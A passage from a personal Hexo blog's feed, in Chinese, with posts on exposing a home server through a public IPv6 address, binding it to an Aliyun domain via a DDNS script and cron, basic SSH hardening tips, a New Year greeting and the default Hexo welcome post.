alt="点击并拖拽以移动"></p><p>弄好以后可以用外网ping一下看分配到的ipv6地址是否能够ping通</p><p>目前如果在服务器上开启一些服务的话是通过<strong>http://[ipv6地址]:端口号</strong>来访问的，这样很麻烦，而且我们从运营商处得到的ipv6地址是一个**动态的地址，**随着计算机重启或者隔一段时间地址就会发生改变，所以我们要获取一个域名，并通过ddns将ipv6地址和域名绑定起来(懒得弄的也可以写个程序定时将ipv6地址发给自己)</p><h3 id="获取域名">获取域名</h3><p>国内获得域名可以通过很多的渠道，我这里是在<a href="https://wanwang.aliyun.com/?scm=20140722.S_card@@%E5%95%86%E5%93%81@@212429.S_cardgbdt.ID_card@@%E5%95%86%E5%93%81@@212429-RL_%E5%9F%9F%E5%90%8D-OR_ser-V_2-P0_0">阿里云</a>上花了8块买了一年的域名（需要实名认证），然后添加记录</p><p><img src="86c56a549f2a47d4b4403705f2ac7017.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>记录类型选择<strong>AAAA表示ipv6地址</strong></p><p>主机记录填写<strong>子域名名称</strong></p><p>记录值填<strong>对应的ipv6地址</strong></p><p>添加完后进行<strong>生效检测</strong>查看是否能够成功解析</p><p><strong>DDNS</strong></p><p>DDNS（Dynamic Domain Name Server，动态域名服务）是将用户的动态IP地址映射到一个固定的域名解析服务上，用户每次连接网络的时候客户端程序就会通过信息传递把该主机的动态IP地址传送给位于服务商主机上的服务器程序，服务器程序负责提供DNS服务并实现动态域名解析。</p><p>网上有很多如何使用DDNS的教程，这里我使用的是是一个大佬分享的python脚本（服务器要安装pyhton运行环境，可以直接下载一个宝塔，会自动安装pyhton3.6）</p><p><a href="https://github.com/zeruns/-Python-aliddns_ipv4-ipv6">zeruns/-Python-aliddns_ipv4-ipv6: 阿里云域名ddns动态域名解析Python源码 (github.com)</a></p><p>使用教程：<a href="https://blog.zeruns.tech/archives/507.html">Python实现阿里云域名DDNS支持ipv4和ipv6 - Zeruns’s Blog</a></p><p>（可以先把自己在阿里云上的ipv6地址改成错误的，然后运行一次程序查看ipv6地址是否被修改回来了）</p><p>接着通过linux中的crontab设置定时任务运行python脚本（我的这里似乎不能直接运行python，需要将用shell脚本运行python然后再用在crontab中定时shell脚本）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/bash</span></span><br><span class="line"><span class="comment">#ddns.sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/xxx  <span class="comment"># 写你自己py文件的文件夹</span></span><br><span class="line">/usr/bin/python3.6 aliddns.py &gt; /dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>添加定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line">0 */4 * * * /home/xxx/ddns.sh  <span class="comment">#这里要输入shell脚本的绝对位置</span></span><br><span class="line"><span class="comment">#我是设置的每4个小时运行一次脚本，大家可以根据自己的情况选择脚本的运行时间</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>这样ipv6地址就和域名绑定起来了</p><p>到此为止基本的搭建任务就结束了</p><h3 id="一些不得不提的安全问题">一些不得不提的安全问题</h3><p>我们一般访问自己的linux服务器都是通过ssh的方式访问的，而将ssh服务直接暴露出来会存在一定的安全风险，所以我们最好做一些安全措施来保护我们的服务器不被他人入侵</p><p>1.使用密钥登录ssh而非使用密码登录，防止被他人暴力破解</p><p>2.修改ssh服务的默认端口，ssh的默认端口是22，而网上很多端口扫描的工具都会将22端口作为端口进行扫描</p><p>3.取消root登录</p><p>4.使用knockd来隐藏端口（终极隐藏大法）</p><p><a href="https://cloud.tencent.com/developer/article/1005328">knockd：CVM云主机的隐形斗篷 - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>虽然这些操作很复杂，但我想告诉你网络安全真的很重要！！！</p><p>（我的一个朋友之前就因为ssh密码被爆破而被入侵了……）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;背景&quot;&gt;背景&lt;/h3&gt;
&lt;p&gt;继上次发现ipv6以来由于要实习，一直只是在尝试部分小功能的实现，终于在这个春节假期才有了一大段空闲时间来部署服务器&lt;/p&gt;
&lt;h3 id=&quot;硬件需求&quot;&gt;硬件需求&lt;/h3&gt;
&lt;p&gt;首先要搭建属于自己的服务器得要有一定的硬件条件，服务器</summary>
      
    
    
    
    <category term="经历" scheme="http://example.com/categories/%E7%BB%8F%E5%8E%86/"/>
    
    
    <category term="ipv6" scheme="http://example.com/tags/ipv6/"/>
    
    <category term="服务器" scheme="http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>利用ipv6实现公网ip</title>
    <link href="http://example.com/post/Using-ipv6-to-realize-public-ip/"/>
    <id>http://example.com/post/Using-ipv6-to-realize-public-ip/</id>
    <published>2023-01-29T12:05:18.000Z</published>
    <updated>2023-02-20T04:35:59.123Z</updated>
    
    <content type="html"><![CDATA[<h3 id="背景"><strong>背景</strong></h3><p>之前很羡慕别人能够有属于自己的个人博客，自己也想拥有，搭建个人博客首先就要有一台个人服务器，要搭建个人服务器得先有公网ip，然而目前公网IPv4资源紧缺，部分运营商是不会随意将公网ip提供给个人的，这就有些难受了</p><h3 id="偶然发现的ipv6">偶然发现的ipv6</h3><p>今天在网上冲浪的时候，突然看到一篇文章，文章中提到“十四五”期间IPv6规模部署任务和目标——2025年底县级以上政府网站完成率达到95%以上。说明在不久的未来，ipv6将替代ipv4成为主流，在查询了相关资料以后，发现目前大多数网络设备都是支持ipv6的，并且由于ipv6非常广泛，不需要使用nat去区分内外网，电脑上获取到的ipv6可以直接在公网上访问。</p><p>首先我们判断自己的网络有没有ipv6，直接在命令窗口中输入ipconfig</p><p><img src="https://img-blog.csdnimg.cn/94b2609b808a47a4b1fca29348ee2fbd.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>如果出现ipv6地址，并且开头不是fe80，那么此时你就已经获取到了一个公网ipv6地址了，如果没有，那么请打开路由器配置网页，一般直接在浏览器中输入网关ip就可以了，登录账号以后，打开路由器的ipv6功能，这里用的是小米的路由器，其他的路由器大家可以自行搜索如何开启ipv6</p><p><img src="https://img-blog.csdnimg.cn/e8ddb9e100f6459f80167b587437493e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>在打开ipv6功能以后再次输入ipconfig查看是否获取到ipv6的地址，也可以通过访问<a href="https://test-ipv6.cz/">ipv6测试</a>来看自己是否开启ipv6功能</p><p><img src="https://img-blog.csdnimg.cn/90a5f83540324f2ba1e37e7ab2d3eecb.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>到这里路由器的相关配置已经结束了，但我们还是无法在公网中访问到ipv6，这是因为营业商的光猫中对ipv6进行了保护，禁止外网访问我们的ipv6地址，所以我们要对光猫进行配置，电脑浏览器访问<strong>192.168.1.1</strong>，这里要输入<strong>超级管理员</strong>的账号和密码登录才能使用高级功能，而如何获取超级管理员的账号和密码大家可以自行搜索，这里以电信为例登录</p><p><img src="https://img-blog.csdnimg.cn/e6a298d939e541fca638091df69c9684.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>在安全——防火墙中将<strong>防火墙等级改到低</strong>并<strong>关闭启用ipv6 session,</strong><img src="https://img-blog.csdnimg.cn/a5d7186e39f74d7a9baa696511fa37c6.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>在网络设置中选择<strong>INTERNET</strong>连接并选择<strong>ipv4&amp;ipv6</strong></p><p><img src="https://img-blog.csdnimg.cn/6344513f13b34277a0434f66a646c53e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>ipv6配置</p><p><img src="https://img-blog.csdnimg.cn/f4b7d550a2b94c5c94c425dc6ab17a6d.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>在状态——网络侧信息中查看ipv6的地址如下图所示则说明配置成功</p><p><img src="https://img-blog.csdnimg.cn/8cfc7f2b86694cfa9331934731a67947.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>到这里光猫的配置就结束了</p><p>然后我们开始测试，这里使用phpstudy开启apache的80服务</p><p><img src="https://img-blog.csdnimg.cn/9c840e9af29a4e4081d456914c3a81b4.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>设置防火墙的入站规则，开启80端口</p><p><img src="https://img-blog.csdnimg.cn/ff9df8fe5ba94650bec4896185801fba.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>通过<a href="https://www.itdog.cn/tcping_ipv6/">IPV6版_在线tcping_tcp延迟测试_持续ping_禁ping_tcping_端口延迟测试</a></p><p>对自己的ipv6进行测试</p><p>全都响应了就说明ipv6公网配置成功了<img src="https://img-blog.csdnimg.cn/7b8b9bf942eb4b1b9e0fcbc93b01d571.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>到这里我们就成功获得了一个能在公网访问的ipv6地址，可以在相关的端口配置服务</p><p>（记得之前三大营业商为了防止服务器满天飞而产生的监管困难，将ipv6的80、443、8080等常见端口给封锁了，但刚才测试了说明ipv6的80端口是可用的，大家有时间可以试试其他的端口）</p><h3 id="一些小缺陷">一些小缺陷</h3><p>1.目前暴露在公网的ipv6并不是所有人都可以访问的，只有自己的设备开启了ipv6功能上网才可以访问（一般手机使用移动数据连接是可以访问ipv6的，如果是连接wifi的话需要配置路由器开启ipv6功能）大家可以访问<a href="https://ipw.cn/ipv6/">IPv6地址查询 | IP查询(ipw.cn)</a>进行测试自己的设备是否能访问ipv6</p><p>2.当前电脑使用的ipv6地址是临时ipv6地址,每一次重启电脑或者重新联网临时ipv6地址都会刷新</p><p>（可以在命令窗口中输入 <strong>netsh interface IPv6 set privacy state=disable</strong> 关闭）</p><h3 id="接下来的目标">接下来的目标</h3><p>1.购买域名，通过域名访问公网ipv6</p><p>2.在linux系统中配置ipv6公网地址</p><h3 id="大佬的文章">大佬的文章</h3><p><a href="https://blog.csdn.net/Cypher_X/article/details/123010419">天降公网ip | 你也许已经有公网IP了_Wuuconix的博客-CSDN博客_wsl 公网ip</a></p><p><a href="https://cloud.tencent.com/developer/article/2067426">IPv6 实用教程 - 腾讯云开发者社区-腾讯云</a></p><p><a href="https://www.xiaoxinys.cn/105885.html">如何搭建ipv6服务器，服务器端搭建DDNS服务的方法-小新网</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;背景&quot;&gt;&lt;strong&gt;背景&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;之前很羡慕别人能够有属于自己的个人博客，自己也想拥有，搭建个人博客首先就要有一台个人服务器，要搭建个人服务器得先有公网ip，然而目前公网IPv4资源紧缺，部分运营商是不会随意将公网ip提供给个人的，这</summary>
      
    
    
    
    <category term="技术" scheme="http://example.com/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="ipv6" scheme="http://example.com/tags/ipv6/"/>
    
  </entry>
  
  <entry>
    <title>新年好</title>
    <link href="http://example.com/post/happy-new-year/"/>
    <id>http://example.com/post/happy-new-year/</id>
    <published>2023-01-21T16:36:32.000Z</published>
    <updated>2023-02-20T04:35:15.993Z</updated>
    
    <content type="html"><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐&lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/post/hello-world/"/>
    <id>http://example.com/post/hello-world/</id>
    <published>2023-01-21T14:57:41.893Z</published>
    <updated>2023-01-21T14:57:41.893Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
